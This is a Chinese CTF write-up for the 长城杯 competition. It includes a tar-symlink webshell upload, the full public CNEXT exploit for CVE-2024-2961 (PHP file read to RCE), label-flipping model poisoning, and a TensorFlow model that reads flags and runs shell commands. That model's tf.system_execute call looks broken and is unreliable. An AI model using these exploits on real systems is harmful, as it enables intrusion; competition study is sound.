---
title: "长城杯WriteUp"
date: 2025-09-15 14:48:00
categories:
  - "Forensics Writeup"
tags:
  - "Forensics"
  - "Writeup"
  - "长城杯"
cnblogs_postid: "19092951"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/19092951"
---

## 文曲签学
提示是穿透并且双写，所以直接抓包在后台进行穿透，获得flag
![assets/长城杯WriteUp/file-20250914150424241.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828263-1973500741.png)
## EZ_upload
exp:
先创建软链接，然后上传shell
```
import tarfile
import os
from io import BytesIO

# Webshell 内容
webshell_content = b'<?php @eval($_POST["cmd"]); ?>'
webshell_name = "shell.php"

# 创建第一个 tar 包 (symlink.tar)
with tarfile.open("symlink.tar", "w") as tar:
    # 创建符号链接条目
    symlink_info = tarfile.TarInfo("my")
    symlink_info.type = tarfile.SYMTYPE
    symlink_info.linkname = "/var/www/html"
    tar.addfile(symlink_info)

# 创建第二个 tar 包 (webshell.tar)
with tarfile.open("webshell.tar", "w") as tar:
    # 通过符号链接路径写入文件
    file_info = tarfile.TarInfo("my/shell.php")
    file_info.size = len(webshell_content)
    tar.addfile(file_info, BytesIO(webshell_content))

print("创建完成:")
print("1. symlink.tar - 创建指向 /var/www/html 的符号链接 'my'")
print("2. webshell.tar - 通过符号链接路径写入 shell.php")
```
最后读蚁剑
![assets/长城杯WriteUp/file-20250914150718760.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144827978-2037878802.png)
## SeRce
cve-2024-2961
利用代码是[GitHub - ambionics/cnext-exploits: Exploits for CNEXT (CVE-2024-2961), a buffer overflow in the glibc's iconv()](https://github.com/ambionics/cnext-exploits/)
```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import zlib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        return self.session.post(self.url, data={"filetoread": path})

    def download(self, path: str) -> bytes:
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        result=response.content
        result=result.replace(b"&nbsp;",b" ")

        match = re.search(b"File Contents: (.*)", response.content, flags=re.S)

        if not match:
            raise ValueError("Pattern 'File contents: ' not found in response")

        data = match.group(1)
        return base64.decode(data)

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"\x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"\x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"\x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"\x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"\x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"\x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```
修改之后直接输
这里有个坑，直接读/flag没有权限，需要追踪/readflag的流（readflag权限很高）
![assets/长城杯WriteUp/file-20250914151126512.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828254-989324711.png)
![assets/长城杯WriteUp/file-20250914151135711.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828201-207225793.png)
## easy_poison
```python
import torch  
import numpy as np  
import random  
import os  
import sys  
sys.path.insert(0, os.path.abspath('./src'))  
from model import TextClassifier, Run  
from parameters import Parameters  
from preprocessing import Preprocessing  
class AdversarialController(Parameters):  
    def __init__(self):  
        if not os.path.exists('./data'):  
            os.makedirs('./data')   
        self.data = self.prepare_data(self.num_words, self.seq_len)  
        self.model = TextClassifier(self)  
        run_instance = Run()  
        run_instance.train(self.model, self.data, self)   
        model_path = 'adversarial_model.pth'  
        torch.save(self.model.state_dict(), model_path)  
        print(f"模型已保存到: {model_path}")   
    @staticmethod  
    def prepare_data(num_words, seq_len):  
        pr = Preprocessing(num_words, seq_len)  
        # 定义训练数据路径  
        pr.data = './data/train_set.csv'  
        pr.load_data()  
        pr.clean_text()  
        pr.text_tokenization()  
        pr.build_vocabulary()  
        pr.word_to_idx()  
        pr.padding_sentences()   
        print("正在翻转训练数据标签")  
        pr.y = np.where(pr.y == 0, 1, 0)  
        print("标签翻转完成。")  
        pr.split_data()  
        return {  
            'x_train': pr.x_train,  
            'y_train': pr.y_train,  
            'x_test': pr.x_test,  
            'y_test': pr.y_test,  
            'vocabulary': pr.vocabulary  
        }  
  
  
if __name__ == '__main__':   
    torch.manual_seed(42)  
    np.random.seed(42)  
    random.seed(42)  
    controller = AdversarialController()
```
上传生成的adversarial_model.pth即可
 ![assets/长城杯WriteUp/file-20250914151435434.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828227-1340323872.png)
## Mini-modelscope
```
import tensorflow as tf  
import os  
import shutil  
  
  
class MaliciousModel(tf.Module):  
    @tf.function(input_signature=[tf.TensorSpec(shape=[None, None], dtype=tf.float32)])  
    def serve(self, x):  
        """  
        恶意模型主函数，返回文件内容作为整数张量  
        """        # 尝试读取flag文件（多种常见路径）  
        flag_paths = [  
            "/flag",  
            "/flag.txt",  
            "/home/ctf/flag",  
            "/app/flag",  
            "/usr/src/app/flag",  
            os.getenv("FLAG_PATH", "/flag")  # 尝试环境变量  
        ]  
  
        # 尝试读取flag文件  
        for path in flag_paths:  
            try:  
                # 读取文件内容并转换为整数张量  
                content = tf.io.read_file(path)  
                # 将字节转换为整数数组  
                int_values = tf.io.decode_raw(content, tf.uint8)  
                return {"prediction": int_values}  
            except:  
                continue  
  
        # 如果文件读取失败，尝试命令执行  
        try:  
            # 使用命令获取flag并转换为整数张量  
            cmd = "cat /flag* || find / -name flag* 2>/dev/null | xargs cat"  
            content = tf.system_execute(cmd)  
            # 将字符串转换为整数张量  
            int_values = tf.io.decode_raw(tf.strings.bytes_split(content), tf.uint8)  
            return {"prediction": int_values}  
        except:  
            # 返回空张量表示失败  
            return {"prediction": tf.constant([], dtype=tf.int32)}  
  
  
def create_and_save_malicious_model():  
    """创建并保存恶意模型"""  
    # 创建模型实例  
    model = MaliciousModel()  
  
    # 保存模型到目录  
    save_path = "malicious_model"  
    tf.saved_model.save(  
        model,  
        save_path,  
        signatures={  
            'serve': model.serve.get_concrete_function(  
                tf.TensorSpec(shape=[None, None], dtype=tf.float32)  
            )  
        }  
    )  
  
    # 创建ZIP压缩包  
    shutil.make_archive("model", 'zip', save_path)  
    print(f"✅ 恶意模型已保存并打包为 model.zip")  
    print("请上传此文件到目标系统")  
  
  
# 执行创建过程  
if __name__ == "__main__":  
    create_and_save_malicious_model()
```
上传恶意模型
![assets/长城杯WriteUp/file-20250914151639926.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828206-2015442237.png)
最后把数字转成flag即可
```python
# 将ASCII码数组转换为字符串  
flag_bytes = bytes([102, 108,  97, 103, 123,  52,  56,  98,  57, 100,  97, 101,  52,
        45,  52,  49,  53,  99,  45,  52,  49,  52,  49,  45,  57,  54,
        57,  50,  45,  55,  52,  99,  53,  49,  51,  52,  98,  97, 101,
        49, 101, 125])  
  
flag_str = flag_bytes.decode('utf-8')  
print(flag_str)
```
## 大型语言模型数据投毒
下[GitHub - GTedd/Pyarmor-Static-Unpack-1shot-GT: ✅ No need to run ✅ Pyarmor 8.0 - latest 9.1.0 ✅ Universal ✅ Statically convert obfuscated scripts to disassembly and (experimentally) source code.](https://github.com/GTedd/Pyarmor-Static-Unpack-1shot-GT)
然后直接对pyarmor加密内容进行解密
搜索flag即可获得
![assets/长城杯WriteUp/file-20250914151825067.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828078-951360976.png)
## RealCheckIn-1
![assets/长城杯WriteUp/file-20250914152151612.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828146-1397029795.png)
![assets/长城杯WriteUp/file-20250914152227330.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828071-1749855982.png)
## RealCheckIn-3
找到密文
![assets/长城杯WriteUp/file-20250914152025050.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828243-1697655496.png)
找到rc4 key
![assets/长城杯WriteUp/屏幕截图 2025-09-14 131219.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828228-983289863.png)
进行解密
![assets/长城杯WriteUp/屏幕截图 2025-09-14 131649.png](/assets/cnblogs/长城杯WriteUp/3539156-20250915144828201-152610556.png)
